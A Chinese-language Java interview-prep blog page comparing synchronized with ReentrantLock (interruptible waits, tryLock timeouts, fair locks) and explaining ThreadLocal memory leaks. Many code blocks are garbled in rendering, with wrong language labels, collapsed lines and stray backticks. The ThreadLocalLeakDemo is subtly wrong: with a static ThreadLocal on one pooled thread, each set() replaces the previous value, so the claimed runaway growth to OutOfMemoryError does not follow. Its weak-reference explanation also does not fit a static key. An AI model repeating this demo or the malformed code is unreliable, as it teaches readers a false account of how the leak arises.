<ul>
<li><code>lockInterruptibly()</code> 可响应中断（用于中断等待中的线程）</li>
<li><code>tryLock(long timeout)</code> 可设置等待锁的超时时间</li>
</ul>
</li>
</ul>
<h3 id="3-公平锁-vs-非公平锁">3. <strong>公平锁 vs 非公平锁</strong></h3>
<ul>
<li><code>synchronized</code>：非公平锁，后来的线程可能先抢到锁</li>
<li><code>ReentrantLock</code>：构造函数可设置为公平锁（先来先得）</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Lock</span> <span class="variable">fairLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>(<span class="literal">true</span>); <span class="comment">// 公平锁</span></span><br></pre></td></tr></table></figure>
<h3 id="4-是否自动释放锁">4. <strong>是否自动释放锁</strong></h3>
<ul>
<li><code>synchronized</code> 自动释放锁</li>
<li><code>ReentrantLock</code> 必须手动 <code>unlock()</code>，否则容易造成死锁</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lock.lock();<span class="string">` `</span>try &#123;<span class="regexp">//</span> 临界区代码<span class="string">` `</span>&#125; finally &#123; <span class="string">``</span>    lock.unlock(); <span class="regexp">//</span> 必须释放<span class="string">` `</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="✅-三、使用场景对比举例">✅ 三、使用场景对比举例</h2>
<h3 id="例子：银行账户转账（存在中断和超时要求）">例子：银行账户转账（存在中断和超时要求）</h3>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> transfer(Account a, Account b, <span class="keyword">int</span> amount) throws InterruptedException &#123;</span><br><span class="line">    <span class="keyword">if</span> (lock1.tryLock(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (lock2.tryLock(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123; <span class="string">``</span>                    a.withdraw(amount); <span class="string">``</span>                    b.deposit(amount); <span class="string">``</span>                &#125; <span class="keyword">finally</span> &#123; <span class="string">``</span>                    lock2.unlock(); <span class="string">``</span>                &#125; <span class="string">``</span>            &#125; <span class="string">``</span>        &#125; <span class="keyword">finally</span> &#123; <span class="string">``</span>            lock1.unlock(); <span class="string">``</span>        &#125; <span class="string">``</span>    &#125; <span class="keyword">else</span> &#123; <span class="string">``</span>        System.<span class="keyword">out</span>.println(<span class="string">&quot;获取锁失败，转账超时&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>如果用 <code>synchronized</code> 就无法实现 tryLock 超时控制，也无法处理中断。</p>
<h2 id="✅-四、面试答题模板总结">✅ 四、面试答题模板总结</h2>
<blockquote>
<p>synchronized 是 JVM 层面的关键字，适用于简单的同步场景，语法简洁但功能受限。ReentrantLock 是 Java API 层的锁，提供了中断锁、超时锁、公平锁等高级功能，适用于复杂并发控制场景。但它需要手动释放锁，使用上更复杂。如果需要更细粒度的控制和更好的并发性能，推荐使用 ReentrantLock。</p>
</blockquote>
<h3 id="✅-一、中断支持（interruptible）">✅ 一、中断支持（interruptible）</h3>
<h4 id="🔸1-使用-synchronized-的运行效果：">🔸1. 使用 <code>synchronized</code> 的运行效果：</h4>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t2.<span class="built_in">int</span>errupt();  <span class="comment">// 尝试中断等待锁的线程 t2</span></span><br></pre></td></tr></table></figure>
<p><strong>效果解释：</strong></p>
<ul>
<li><code>t1</code> 拿到锁后进入 <code>criticalSection()</code> 方法，执行睡眠；</li>
<li><code>t2</code> 也想进入该同步方法，但会阻塞在 <code>monitorenter</code> 操作上（底层是 OS 层面挂起），不能响应中断；</li>
<li>执行 <code>t2.interrupt()</code> 并<strong>不会中断它的阻塞</strong>，t2 还是要等 t1 释放锁才会继续；</li>
<li>所以你会发现：<strong>t2 不会抛出 InterruptedException</strong>，即使你调用了中断。</li>
</ul>
<p>📌 <strong>总结</strong>：<code>synchronized</code> 不支持中断锁等待线程，它是阻塞不可打断的。</p>
<h4 id="✅-2-使用-ReentrantLock-lockInterruptibly-的运行效果：">✅ 2. 使用 <code>ReentrantLock.lockInterruptibly()</code> 的运行效果：</h4>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lock.lockInterruptibly()<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p><strong>效果解释：</strong></p>
<ul>
<li><code>t1</code> 拿到锁后开始执行逻辑；</li>
<li><code>t2</code> 调用 <code>lockInterruptibly()</code> 阻塞等待锁；</li>
<li>执行 <code>t2.interrupt()</code> 后，<strong>t2 会立即抛出 InterruptedException，退出等待状态</strong>；</li>
<li>日志中会打印出：</li>
<li><code>Thread-1 was interrupted</code></li>
</ul>
<p>📌 <strong>总结</strong>：<code>ReentrantLock</code> 的 <code>lockInterruptibly()</code> 支持中断等待，适用于优雅终止任务、线程池控制等场景。</p>
<h3 id="✅-二、超时控制">✅ 二、超时控制</h3>
<h4 id="🔸1-synchronized-的运行效果：">🔸1. <code>synchronized</code> 的运行效果：</h4>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//</span> synchronized 没有 <span class="keyword">try</span>Lock<span class="params">()</span> 或 timeout 概念</span><br></pre></td></tr></table></figure>
<p><strong>效果解释：</strong></p>
<ul>
<li>线程会一直阻塞直到前一个线程释放锁；</li>
<li><strong>无法设置超时时间，线程必须等到锁被释放为止</strong>；</li>
<li>如果遇到死锁或阻塞时间过长，将会导致系统卡死或吞吐下降。</li>
</ul>
<p>📌 <strong>总结</strong>：没有超时控制意味着 <code>synchronized</code> 对资源争抢不具备灵活性。</p>
<h4 id="✅-2-ReentrantLock-tryLock-timeout">✅ 2. <code>ReentrantLock.tryLock(timeout)</code></h4>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lock.tryLock(<span class="number">2</span>, TimeUnit.SECONDS)) &#123; <span class="string">``</span>    ... <span class="string">``</span>&#125; <span class="keyword">else</span> &#123; <span class="string">``</span>    System.<span class="keyword">out</span>.println(<span class="string">&quot;获取锁超时，放弃处理&quot;</span>); <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>效果解释：</strong></p>
<ul>
<li><code>t2</code> 会尝试在 2 秒内获取锁；</li>
<li>如果 <code>t1</code> 2 秒内没释放，<code>t2</code> 会输出：</li>
<li><code>获取锁超时，放弃处理</code></li>
<li>不会阻塞太久，从而提高系统的响应性。</li>
</ul>
<p>📌 <strong>总结</strong>：适合高并发服务中，对响应时间有要求的场景（比如秒杀、异步任务分发等）。</p>
<h3 id="✅-三、公平性控制">✅ 三、公平性控制</h3>
<h4 id="🔸1-synchronized-的运行效果：-2">🔸1. <code>synchronized</code> 的运行效果：</h4>
<p><strong>效果解释：</strong></p>
<ul>
<li>JVM 和操作系统调度器无法保证“先进先出”；</li>
<li>如果 <code>t3</code> 更容易被 OS 调度到，就可能<strong>插队先拿到锁</strong>，而不是等待最久的线程。</li>
</ul>
<p>📌 <strong>总结</strong>：<code>synchronized</code> 是非公平锁，容易导致“饿死”问题（线程长时间等不到锁）。</p>
<h4 id="✅-2-ReentrantLock-true-公平锁的运行效果：">✅ 2. <code>ReentrantLock(true)</code> 公平锁的运行效果：</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Lock</span> <span class="variable">fairLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p><strong>效果解释：</strong></p>
<ul>
<li>锁会维护一个 FIFO 队列；</li>
<li>等待最久的线程优先拿到锁；</li>
<li>如果你创建多个线程顺序调用加锁，你会观察到线程会<strong>按顺序打印拿到锁的日志</strong>。</li>
</ul>
<p>📌 <strong>总结</strong>：适合对资源访问顺序要求严格的系统，比如：</p>
<ul>
<li>排队任务分发</li>
<li>银行柜台服务</li>
</ul>
<h2 id="✅-总结面试话术模板">✅ 总结面试话术模板</h2>
<blockquote>
<p><code>synchronized</code> 是简单的 JVM 级锁机制，但在高并发场景下有不少限制：它不支持中断等待，也无法设置超时时间，调度也不是公平的。而 <code>ReentrantLock</code> 是显式锁，可以支持线程中断、限时等待、公平性策略，非常适合需要灵活并发控制的业务。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SynchronizedInterruptLogDemo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss.SSS&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[&quot;</span> + sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>()) + <span class="string">&quot;] &quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">                log(<span class="string">&quot;Thread-0 获取到锁，开始执行&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    log(<span class="string">&quot;Thread-0 被中断&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                log(<span class="string">&quot;Thread-0 执行完毕，释放锁&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">                log(<span class="string">&quot;Thread-1 获取到锁，开始执行&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>); <span class="comment">// 确保 t1 拿到锁</span></span><br><span class="line">        t2.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>); <span class="comment">// 确保 t2 进入阻塞状态</span></span><br><span class="line"></span><br><span class="line">        log(<span class="string">&quot;主线程尝试中断 Thread-1&quot;</span>);</span><br><span class="line">        t2.interrupt(); <span class="comment">// 中断 t2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjNhZGI0NTY4N2ZmNGNkNWU0Yzk2ZDQwZmExNmZhMzdfY0hHRW9CR3puMXBoY084SUJQNTdsMTZmNWltSlVUbXdfVG9rZW46Slo1U2JRdWpXb2Z6d3R4eFRiemNnR0RPbjZiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LockInterruptLogDemo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss.SSS&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[&quot;</span> + sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>()) + <span class="string">&quot;] &quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                log(<span class="string">&quot;Thread-0 获取到锁，开始执行&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                log(<span class="string">&quot;Thread-0 执行完毕&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                log(<span class="string">&quot;Thread-0 被中断&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">                log(<span class="string">&quot;Thread-0 释放锁&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                log(<span class="string">&quot;Thread-1 尝试获取锁&quot;</span>);</span><br><span class="line">                lock.lockInterruptibly(); <span class="comment">// 支持响应中断</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    log(<span class="string">&quot;Thread-1 获取到锁，开始执行&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    lock.unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                log(<span class="string">&quot;Thread-1 在等待锁时被中断，退出&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>); <span class="comment">// 确保 t1 获取到锁</span></span><br><span class="line">        t2.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>); <span class="comment">// 确保 t2 正在尝试获取锁</span></span><br><span class="line"></span><br><span class="line">        log(<span class="string">&quot;主线程尝试中断 Thread-1&quot;</span>);</span><br><span class="line">        t2.interrupt(); <span class="comment">// 中断 t2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODE2NmM5ZmU4OTg3Y2UwMDVjZGY0OGU0MGZhZWE3ZmFfczF1TG4xUnFZazNTMXZ6RVoydFByY05BMzZrc1FkdmFfVG9rZW46WlFBNWJnZzlob0hSMkt4Qk9zTmN5UnlsbjZkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="ThreadLocal的内存泄露问题">ThreadLocal的内存泄露问题</h2>
<h3 id="ThreadLocal是什么">ThreadLocal是什么</h3>
<p><code>ThreadLocal</code> 是 Java 提供的一种 <strong>线程本地变量机制</strong>，让每个线程都可以拥有自己的独立变量副本，<strong>互不干扰</strong>。它广泛用于解决多线程环境下<strong>变量共享带来的线程安全问题</strong>，如用户登录上下文、数据库连接、事务控制等场景。</p>
<h2 id="✅-一、通俗理解">✅ 一、通俗理解</h2>
<p>你可以把 <code>ThreadLocal</code> 想象成一个 <strong>为每个线程准备的“小抽屉”</strong>，每个线程都可以往自己的抽屉里放东西，拿出来时也只能拿自己的，<strong>互相看不到对方的内容</strong>。</p>
<h2 id="✅-二、核心原理">✅ 二、核心原理</h2>
<p>每个线程（<code>Thread</code> 对象）内部都维护了一个 <code>ThreadLocalMap</code>，这个 Map 的 key 是 <code>ThreadLocal</code> 对象，value 是你存储的变量。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Thread</span> </span>&#123; <span class="string">``</span>    ThreadLocal.ThreadLocalMap threadLocals; <span class="regexp">//</span> 每个线程都有自己的<span class="string">` `</span>&#125;</span><br></pre></td></tr></table></figure>
<p>当你调用：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threadLocal.<span class="built_in">set</span>(<span class="string">&quot;abc&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>等价于：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前线程.threadLocals.<span class="keyword">put</span>(threadLocal, <span class="string">&quot;abc&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>当你调用：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threadLocal.<span class="built_in">get</span>();</span><br></pre></td></tr></table></figure>
<p>等价于：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前线程.threadLocals.<span class="keyword">get</span>(threadLocal); <span class="comment">// 拿到的是自己的</span></span><br></pre></td></tr></table></figure>
<h2 id="✅-三、简单例子：不同线程的变量互不影响">✅ 三、简单例子：不同线程的变量互不影响</h2>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadLocalExample</span> &#123; <span class="string">``</span>    <span class="string">``</span><span class="keyword">private</span> <span class="keyword">static</span> final <span class="title class_">ThreadLocal</span>&lt;<span class="title class_">String</span>&gt; threadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();<span class="string">``</span> <span class="string">``</span>    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="title class_">String</span>[] args</span>) &#123; <span class="string">``</span>        <span class="title class_">Runnable</span> task = () -&gt; &#123;</span><br><span class="line">            <span class="title class_">String</span> name = <span class="title class_">Thread</span>.<span class="title function_">currentThread</span>().<span class="title function_">getName</span>(); <span class="string">``</span>            threadLocal.<span class="title function_">set</span>(<span class="string">&quot;Hello from &quot;</span> + name);</span><br><span class="line">            <span class="keyword">try</span> &#123; <span class="string">``</span>                <span class="title class_">Thread</span>.<span class="title function_">sleep</span>(<span class="number">100</span>); <span class="string">``</span>            &#125; <span class="keyword">catch</span> (<span class="title class_">InterruptedException</span> ignored) &#123;&#125; <span class="string">``</span>            <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(name + <span class="string">&quot; --&gt; &quot;</span> + threadLocal.<span class="title function_">get</span>()); <span class="string">``</span>        &#125;; <span class="string">``</span>        <span class="keyword">new</span> <span class="title class_">Thread</span>(task, <span class="string">&quot;Thread-A&quot;</span>).<span class="title function_">start</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(task, <span class="string">&quot;Thread-B&quot;</span>).<span class="title function_">start</span>(); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="输出结果：">输出结果：</h3>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread-<span class="selector-tag">A</span> --&gt; Hello <span class="selector-tag">from</span> Thread-<span class="selector-tag">A</span>` `Thread-<span class="selector-tag">B</span> --&gt; Hello <span class="selector-tag">from</span> Thread-<span class="selector-tag">B</span></span><br></pre></td></tr></table></figure>
<p>两个线程各自维护一份数据，互不影响。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRmNjJmNGRjZGRmNDg4ZjlhNjdkYzA5MjI2ODUxZmZfU1B4cndON3JDVHVkTEVodzVwM0ZUUHZCWjRhM0FDMUNfVG9rZW46RGZIUmJheG1mb0RHeUF4MjR4ZmNaQ3ZyblNmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="内存泄露问题">内存泄露问题</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE5NDU1NjZiYzdkNGNiZTYwZDkxZmExOWMzYmYxOTdfa0pzekRHQlBqNndDa01DVkhQTE5wQ1Nob1ROSWtJZ3pfVG9rZW46SWxZbmJrWmtwb1ZyTHZ4SE84RWNWUmVNbldmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧨-三、那为什么会内存泄漏？">🧨 三、那为什么会内存泄漏？</h2>
<h3 id="✅-正常情况：">✅ 正常情况：</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThreadLocal&lt;<span class="built_in">String</span>&gt; <span class="built_in">local</span> = <span class="literal">new</span> ThreadLocal&lt;&gt;(); <span class="string">``</span><span class="built_in">local</span>.<span class="built_in">set</span>(<span class="string">&quot;abc&quot;</span>);<span class="string">` `</span><span class="comment">// 最后你写了：` `local.remove(); // ✅ 手动清理</span></span><br></pre></td></tr></table></figure>
<p>Map 中会把这一对 Entry 移除，GC 没有问题。</p>
<h3 id="❌-异常情况（最容易踩坑）：">❌ 异常情况（最容易踩坑）：</h3>
<p>你写了：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThreadLocal&lt;<span class="built_in">String</span>&gt; <span class="built_in">local</span> = <span class="literal">new</span> ThreadLocal&lt;&gt;(); <span class="string">``</span><span class="built_in">local</span>.<span class="built_in">set</span>(<span class="string">&quot;abc&quot;</span>);<span class="string">` `</span><span class="comment">// 你忘了 remove()</span></span><br></pre></td></tr></table></figure>
<p>这时候：</p>
<ul>
<li>ThreadLocal 对象被 GC 回收了（是弱引用）</li>
<li>但是 <code>&quot;abc&quot;</code> 还在 Thread 的 <code>ThreadLocalMap</code> 中</li>
<li>它变成一个没有 key 的 “孤儿 value”</li>
<li>如果你用线程池，这个 Thread 不会结束，那 value 永远无法回收！</li>
</ul>
<h3 id="📌-这就是内存泄漏-——-“有用的内存占着但永远访问不到”。">📌 这就是<strong>内存泄漏</strong> —— “有用的内存占着但永远访问不到”。</h3>
<h2 id="🧪-四、演示内存泄漏的例子（线程池-不-remove）">🧪 四、演示内存泄漏的例子（线程池 + 不 remove）</h2>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocalLeakDemo</span> </span>&#123;</span><br><span class="line">    private static final ThreadLocal&lt;byte[]&gt; threadLocal = new ThreadLocal&lt;&gt;(); <span class="string">``</span>    public static void main(String[] args) throws InterruptedException&#123;</span><br><span class="line">        ExecutorService executor = Executors.newFixedThreadPool(<span class="number">1</span>); <span class="regexp">//</span> 只有一个线程 <span class="string">``</span>        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123; <span class="string">``</span>            executor.submit(() -&gt; &#123; <span class="string">``</span>                threadLocal.set(new byte[<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>]); <span class="regexp">//</span> 10MB <span class="string">``</span>                // threadLocal.remove(); <span class="regexp">//</span> ❌ 没写这个，就会内存泄漏<span class="string">` `</span>            &#125;); <span class="string">``</span>            Thread.sleep(<span class="number">10</span>); <span class="regexp">//</span> 放慢提交速度<span class="string">` `</span>        &#125; <span class="string">``</span>        executor.shutdown(); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="☠️-运行后现象：">☠️ 运行后现象：</h3>
<ul>
<li>程序内存越来越大</li>
<li>最终 <code>OutOfMemoryError: Java heap space</code></li>
<li>原因：每个任务分配了 10MB 的 value，但都没有 remove，而线程没有结束 → value 永远无法回收</li>
</ul>
<h2 id="为什么会内存泄露？">为什么会内存泄露？</h2>
<p>如果我们在使用完 <code>ThreadLocal</code> 后没有调用 <code>remove()</code>，那么：</p>
<ol>
<li><code>ThreadLocal</code> 作为弱引用被 GC 回收。</li>
<li>对应的 value 仍强引用存在于 <code>ThreadLocalMap</code> 中，Thread 未结束 → <code>ThreadLocalMap</code> 不被回收。</li>
<li>导致 <strong>value 永远无法访问且无法 GC</strong> —— 内存泄漏！</li>
</ol>
<h3 id="关键：Thread-是强引用的，在线程池中线程不结束，ThreadLocalMap-长时间存活。">关键：Thread 是强引用的，在线程池中线程不结束，<code>ThreadLocalMap</code> 长时间存活。</h3>
